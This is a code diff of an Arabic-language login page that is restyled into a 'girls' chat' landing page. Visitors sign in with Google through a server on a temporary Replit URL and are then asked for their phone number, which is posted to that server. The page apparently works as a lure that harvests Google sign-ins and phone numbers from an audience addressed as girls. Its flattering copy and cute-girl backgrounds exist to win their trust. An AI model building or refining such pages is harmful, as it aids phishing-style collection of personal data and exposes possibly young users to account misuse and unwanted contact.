@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>تسجيل الدخول</title>
+    <title>مرحباً بك في شات البنات! 🌸</title>
     <style>
         body {
             margin: 0; padding: 0;
-            background-image: url('https://images.unsplash.com/photo-1506765515384-028b60a970df?auto=format&fit=crop&w=1400&q=80');
-            background-size: cover; background-position: center;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             height: 100vh;
             display: flex; align-items: center; justify-content: center;
             color: #333;
+            background-size: cover;
+            background-position: center;
+            transition: background-image 0.5s ease-in-out; /* لتغيير سلس للخلفية */
         }
         .container {
             background: rgba(255, 255, 255, 0.95);
@@ -20,93 +21,101 @@
             border-radius: 15px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.3);
             text-align: center;
-            max-width: 450px;
+            max-width: 480px; /* زيادة بسيطة للعرض */
             width: 90%;
             animation: fadeIn 1s ease-out;
+            position: relative; /* للمساعدة في وضع العناصر */
+            z-index: 2; /* فوق الخلفية */
         }
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(-20px); }
             to { opacity: 1; transform: translateY(0); }
         }
         h1 {
-            margin-bottom: 30px;
-            font-size: 32px;
-            color: #2c3e50;
-            line-height: 1.4;
+            margin-bottom: 25px;
+            font-size: 34px; /* حجم أكبر */
+            color: #d62c8e; /* لون بناتي */
+            line-height: 1.3;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
         }
         p {
-            font-size: 1.1em;
-            margin-bottom: 25px;
-            color: #555;
+            font-size: 1.15em; /* حجم أكبر للنص */
+            margin-bottom: 30px;
+            color: #666;
+            line-height: 1.6;
         }
         .login-btn {
             font-size: 20px;
-            padding: 14px 28px;
+            padding: 15px 30px; /* زيادة في الحجم */
             background: #4285F4; /* Google Blue */
             color: white;
             border: none;
             border-radius: 8px;
             text-decoration: none;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.25);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
             cursor: pointer;
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            transition: background 0.3s ease, transform 0.2s ease;
+            gap: 12px; /* مسافة أكبر بين الأيقونة والنص */
+            transition: background 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
         }
         .login-btn:hover {
             background: #3367D6;
-            transform: translateY(-3px);
+            transform: translateY(-4px); /* حركة أجمل */
+            box-shadow: 0 6px 15px rgba(0,0,0,0.4);
         }
         .login-btn img {
-            width: 24px;
-            height: 24px;
+            width: 26px; /* حجم أكبر للأيقونة */
+            height: 26px;
         }
 
         /* Phone Input Section Styling */
         .phone-section {
             display: none; /* Hidden by default */
-            margin-top: 20px;
+            margin-top: 25px;
         }
         .phone-section h2 {
-            font-size: 28px;
-            color: #2c3e50;
+            font-size: 30px;
+            color: #d62c8e; /* نفس اللون البينك */
             margin-bottom: 20px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
         }
         .phone-section p {
-            font-size: 1em;
+            font-size: 1.05em;
             margin-bottom: 25px;
             color: #666;
         }
         .phone-section input[type="tel"] {
             width: calc(100% - 24px);
-            padding: 12px;
+            padding: 14px; /* حجم أكبر للـ input */
             margin-bottom: 20px;
-            border: 1px solid #ccc;
+            border: 1px solid #d62c8e; /* border بلون بناتي */
             border-radius: 8px;
-            font-size: 18px;
+            font-size: 19px;
             box-sizing: border-box;
             text-align: right;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
         }
         .phone-section button {
-            background-color: #28a745; /* Green for submit */
+            background-color: #ff69b4; /* Pink for submit */
             color: white;
-            padding: 14px 28px;
-            font-size: 18px;
+            padding: 15px 30px; /* حجم أكبر للزر */
+            font-size: 19px;
             border: none;
             border-radius: 8px;
             cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.25);
-            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
         }
         .phone-section button:hover {
-            background-color: #218838;
-            transform: translateY(-3px);
+            background-color: #e05e9e;
+            transform: translateY(-4px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.4);
         }
         .message {
-            margin-top: 15px;
-            font-size: 1em;
+            margin-top: 20px;
+            font-size: 1.05em;
             font-weight: bold;
         }
         .error {
@@ -120,25 +129,25 @@
 <body>
     <div class="container">
         <div id="loginSection">
-            <h1>مرحباً بك 👋<br>قم بتسجيل الدخول بحسابك في Google</h1>
-            <p>لتسجيل الدخول بأمان، سيتم توجيهك إلى صفحة خارجية.</p>
+            <h1>أهلاً بكِ في عالمنا! 💖<br>ادخلي للشات مع حسابك في Google</h1>
+            <p>مجتمعنا الرائع في انتظاركِ! سجلي دخولكِ بأمان وكوني جزءاً من عائلتنا.</p>
             <a href="#" class="login-btn" id="googleLoginBtn">
                 <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google icon">
-                تسجيل الدخول إلى جوجل
+                دخول سريع مع جوجل
             </a>
         </div>
 
         <div id="phoneSection" class="phone-section">
-            <h2>📱 أدخل رقم هاتفك لإكمال العملية</h2>
-            <p>بعد إدخال رقم هاتفك، سيتم توجيهك إلى صفحة الدردشة.</p>
+            <h2>📱 خطوة أخيرة! أدخلي رقم هاتفكِ الجميل</h2>
+            <p>رقمكِ مهم لتأكيد هويتكِ والانتقال مباشرةً إلى محادثاتنا الممتعة.</p>
             <input type="tel" id="phoneNumber" placeholder="مثال: 01012345678" required />
-            <button id="submitPhoneBtn">تأكيد وانتقال للدردشة</button>
+            <button id="submitPhoneBtn">تأكيد ودخول عالم الشات ✨</button>
             <div id="phoneMessage" class="message"></div>
         </div>
     </div>
 
     <script>
-        // **هام جداً: تم تحديث هذا المتغير ليتطابق مع النطاق العام لسيرفر Node.js الخاص بك**
+        // **هام جداً: هذا المتغير يجب أن يتطابق مع النطاق العام لسيرفر Node.js الخاص بك**
         const REPLIT_SERVER_URL = "https://2d0146b2-69f8-4294-a0e7-9f8c291db932-00-1p81zuprc3lo0.spock.replit.dev";
         const phoneSection = document.getElementById('phoneSection');
         const loginSection = document.getElementById('loginSection');
@@ -146,7 +155,16 @@
         const submitPhoneBtn = document.getElementById('submitPhoneBtn');
         const phoneMessage = document.getElementById('phoneMessage');
 
-        // الربط الصحيح لزر تسجيل الدخول بجوجل (الـ href في الـ HTML تم تركه فاضي عشان JS هو اللي هيتحكم فيه)
+        // صور الخلفية المختلفة
+        const loginBgImage = 'https://images.unsplash.com/photo-1517726558451-b06256277983?auto=format&fit=crop&w=1400&q=80'; // صورة بنت كيوت للمرحلة الأولى
+        const phoneBgImage = 'https://images.unsplash.com/photo-1543852786-1cf6624237c8?auto=format&fit=crop&w=1400&q=80'; // صورة بنت كيوت مختلفة للمرحلة الثانية
+
+        // دالة لتغيير الخلفية
+        function setBackgroundImage(imageUrl) {
+            document.body.style.backgroundImage = `url('${imageUrl}')`;
+        }
+
+        // الربط الصحيح لزر تسجيل الدخول بجوجل
         document.getElementById('googleLoginBtn').addEventListener('click', (event) => {
             event.preventDefault(); // منع السلوك الافتراضي للرابط
             window.location.href = `${REPLIT_SERVER_URL}/auth/google`;
@@ -165,9 +183,11 @@
             if (authStatus === 'success') {
                 loginSection.style.display = 'none';
                 phoneSection.style.display = 'block';
+                setBackgroundImage(phoneBgImage); // تغيير الخلفية لمرحلة رقم الهاتف
             } else {
                 loginSection.style.display = 'block';
                 phoneSection.style.display = 'none';
+                setBackgroundImage(loginBgImage); // الخلفية الافتراضية لتسجيل الدخول
             }
         });
 
@@ -191,7 +211,6 @@
             phoneMessage.className = 'message'; 
 
             try {
-                // تم تعديل المتغير هنا ليكون REPLIT_SERVER_URL
                 const response = await fetch(`${REPLIT_SERVER_URL}/submit-phone`, {
                     method: 'POST',
                     headers: {
